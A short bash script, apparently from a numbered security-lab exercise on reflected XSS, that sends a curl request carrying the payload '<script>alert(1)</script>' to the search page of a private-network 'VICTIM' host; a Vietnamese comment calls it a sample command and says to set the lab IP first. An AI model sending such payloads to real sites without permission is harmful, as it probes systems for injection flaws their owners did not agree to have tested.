#!/bin/bash
# 14-reflected-xss — SUA IP cho dung lab that truoc khi chay. Day la lenh mau.
VICTIM="192.168.100.20"
curl -G "http://$VICTIM/search" --data-urlencode "q=<script>alert(1)</script>"
